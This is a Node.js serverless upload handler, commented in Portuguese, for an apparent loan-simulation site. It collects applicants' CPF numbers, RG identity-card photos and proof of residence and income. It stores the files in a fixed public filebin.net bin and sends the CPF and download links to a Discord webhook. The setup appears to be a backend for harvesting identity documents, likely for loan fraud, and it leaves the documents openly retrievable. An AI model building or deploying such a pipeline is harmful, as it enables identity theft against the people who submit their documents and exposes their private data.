// api/upload-cadastro.js - Proxy para upload múltiplos documentos no Filebin + Discord
import formidable from 'formidable';
import fs from 'fs';  // Para limpar arquivos temporários

export default async function handler(req, res) {
    // Configuração de CORS manual (mesmo domínio do primeiro form)
    const allowedOrigin = 'https://emprestimo-simonetti.wuaze.com';  // <-- SUBSTITUA PELO SEU DOMÍNIO EXATO NO INFINITYFREE
    res.setHeader('Access-Control-Allow-Origin', allowedOrigin);
    res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS, POST');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    res.setHeader('Access-Control-Allow-Credentials', 'true');

    // Handle preflight OPTIONS request
    if (req.method === 'OPTIONS') {
        res.status(200).end();
        return;
    }

    // Só permite POST
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method Not Allowed' });
    }

    // Parse FormData com formidable (múltiplos arquivos)
    const form = formidable({
        multiples: true,  // Permite múltiplos arquivos
        maxFileSize: 5 * 1024 * 1024,  // 5MB por arquivo
        keepExtensions: true,
        uploadDir: '/tmp',  // Pasta temp no serverless
    });

    let fields, files;
    try {
        [fields, files] = await form.parse(req);
    } catch (error) {
        console.error('Erro no formidable:', error);
        return res.status(400).json({ error: 'Erro ao processar o formulário. Verifique os arquivos.' });
    }

    // Extrai campos de texto
    const cpf = fields.cpf ? fields.cpf[0] : null;
    const tipoRenda = fields.tipoRenda ? fields.tipoRenda[0] : null; // Novo campo

    // Extrai arquivos (array se múltiplos, mas esperamos um por campo)
    const rgFrenteFile = files.rgFrente ? files.rgFrente[0] : null;
    const rgVersoFile = files.rgVerso ? files.rgVerso[0] : null;
    const comprovanteResidenciaFile = files.comprovanteResidencia ? files.comprovanteResidencia[0] : null; // Novo arquivo
    const comprovanteRendaFile = files.comprovanteRenda ? files.comprovanteRenda[0] : null; // Novo arquivo (opcional)

    const DISCORD_WEBHOOK_URL4 = process.env.DISCORD_WEBHOOK_URL4;

    // Validação de campos obrigatórios
    if (!cpf || !tipoRenda || !rgFrenteFile || !rgVersoFile || !comprovanteResidenciaFile || !DISCORD_WEBHOOK_URL4) {
        // Limpa arquivos temp
        const allFilesToClean = [rgFrenteFile, rgVersoFile, comprovanteResidenciaFile, comprovanteRendaFile].filter(Boolean);
        allFilesToClean.forEach(f => {
            if (f && f.filepath) fs.unlinkSync(f.filepath);
        });
        return res.status(400).json({ error: 'Dados incompletos: CPF, Tipo de Renda, RG (Frente e Verso) e Comprovante de Residência são obrigatórios.' });
    }

    // Validações de tipo e tamanho de arquivo
    const allowedImageTypes = ['image/png', 'image/jpeg', 'image/jpg'];
    const allowedPdfTypes = ['application/pdf'];
    const allFiles = [rgFrenteFile, rgVersoFile, comprovanteResidenciaFile, comprovanteRendaFile].filter(Boolean); // Filtra nulos

    for (const file of allFiles) {
        const mimeType = file.mimetype || '';
        let isAllowed = false;

        // RG (Frente e Verso) só aceitam imagens
        if (file === rgFrenteFile || file === rgVersoFile) {
            isAllowed = allowedImageTypes.includes(mimeType);
        }
        // Comprovantes aceitam imagens e PDF
        else if (file === comprovanteResidenciaFile || file === comprovanteRendaFile) {
            isAllowed = allowedImageTypes.includes(mimeType) || allowedPdfTypes.includes(mimeType);
        }

        if (!isAllowed) {
            allFiles.forEach(f => { if (f && f.filepath) fs.unlinkSync(f.filepath); });
            return res.status(400).json({ error: `Tipo de arquivo inválido para ${file.originalFilename}: só PNG, JPEG, JPG ou PDF (para comprovantes).` });
        }
        if (file.size > 5 * 1024 * 1024) {
            allFiles.forEach(f => { if (f.filepath) fs.unlinkSync(f.filepath); });
            return res.status(400).json({ error: `Arquivo ${file.originalFilename} muito grande: máximo 5MB.` });
        }
    }

    // Validação CPF (11 dígitos)
    if (cpf.replace(/\D/g, '').length !== 11) {
        allFiles.forEach(f => { if (f && f.filepath) fs.unlinkSync(f.filepath); });
        return res.status(400).json({ error: 'CPF inválido: deve ter 11 dígitos.' });
    }

    try {
        // Configurações do Filebin
        const BIN_NAME = 'simulacoes-documentos-simonetti';  // Bin dedicado para simulações
        const FILEBIN_BASE_URL = 'https://filebin.net';
        const timestamp = Date.now();
        const cpfLimpo = cpf.replace(/\D/g, '');

        // Função auxiliar para upload de um arquivo
        async function uploadToFilebin(file, prefix) {
            if (!file) return null; // Retorna null se o arquivo não for fornecido (para opcionais)

            const ext = file.originalFilename ? file.originalFilename.split('.').pop() : 'bin'; // Default para 'bin' se não tiver extensão
            const filename = `${prefix}-${cpfLimpo}-${timestamp}.${ext}`;
            const fileBuffer = fs.readFileSync(file.filepath);

            const uploadResponse = await fetch(`${FILEBIN_BASE_URL}/${BIN_NAME}/${filename}`, {
                method: 'POST',
                headers: {
                    'Content-Type': file.mimetype || 'application/octet-stream', // Default para octet-stream
                },
                body: fileBuffer,
            });

            if (!uploadResponse.ok) {
                const errorText = await uploadResponse.text();
                console.error(`Erro Filebin para ${prefix}:`, errorText);
                throw new Error(`Falha no upload de ${prefix}: ${errorText}`);
            }

            await uploadResponse.json();  // 201 com JSON (ignora, só confirma)
            return `${FILEBIN_BASE_URL}/${BIN_NAME}/${filename}`;  // URL direta
        }

        // Uploads paralelos para os arquivos
        const [linkRgFrente, linkRgVerso, linkComprovanteResidencia, linkComprovanteRenda] = await Promise.all([
            uploadToFilebin(rgFrenteFile, 'rg-frente'),
            uploadToFilebin(rgVersoFile, 'rg-verso'),
            uploadToFilebin(comprovanteResidenciaFile, 'comprovante-residencia'),
            uploadToFilebin(comprovanteRendaFile, 'comprovante-renda') // Opcional, pode retornar null
        ]);

        // Limpa arquivos temp
        allFiles.forEach(f => { if (f && f.filepath) fs.unlinkSync(f.filepath); });

        // Notificação para Discord
        const discordPayload = {
            username: 'Nova Simulação de Empréstimo',
            avatar_url: 'https://cdn-icons-png.flaticon.com/512/181/181095.png', // Ícone genérico
            embeds: [
                {
                    title: 'Nova Simulação Recebida!',
                    description: `Uma nova simulação de empréstimo foi preenchida e documentos anexados.`,
                    color: 13706550, // Um tom de vermelho para combinar com o site
                    fields: [
                        { name: 'CPF', value: cpf, inline: true },
                        { name: 'Tipo de Renda', value: tipoRenda, inline: true },
                        { name: 'RG - Frente', value: `[Visualizar](${linkRgFrente})`, inline: false },
                        { name: 'RG - Verso', value: `[Visualizar](${linkRgVerso})`, inline: false },
                        { name: 'Comprovante de Residência', value: `[Visualizar](${linkComprovanteResidencia})`, inline: false },
                        // Adiciona o comprovante de renda apenas se ele foi enviado
                        ...(linkComprovanteRenda ? [{ name: 'Comprovante de Renda', value: `[Visualizar](${linkComprovanteRenda})`, inline: false }] : []),
                    ],
                    timestamp: new Date().toISOString(),
                    footer: { text: 'Filebin via Vercel Proxy' },
                },
            ],
        };

        const discordResponse = await fetch(DISCORD_WEBHOOK_URL4, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(discordPayload),
        });

        if (!discordResponse.ok) {
            const errorText = await discordResponse.text();
            console.error('Falha no Discord:', errorText);
            // Continua, pois upload OK
        }

        // Resposta de sucesso
        res.status(200).json({ 
            success: true, 
            message: 'Simulação e documentos enviados com sucesso!', 
            links: { 
                rgFrente: linkRgFrente, 
                rgVerso: linkRgVerso, 
                comprovanteResidencia: linkComprovanteResidencia,
                comprovanteRenda: linkComprovanteRenda // Inclui o link opcional
            }
        });

    } catch (error) {
        console.error('Erro no upload-cadastro:', error);
        allFiles.forEach(f => { if (f && f.filepath) fs.unlinkSync(f.filepath); });
        res.status(500).json({ error: 'Erro interno no servidor: ' + error.message });
    }
}

export const config = {
    api: {
        bodyParser: false,  // Essencial para multipart/form-data com múltiplos arquivos
    },
};
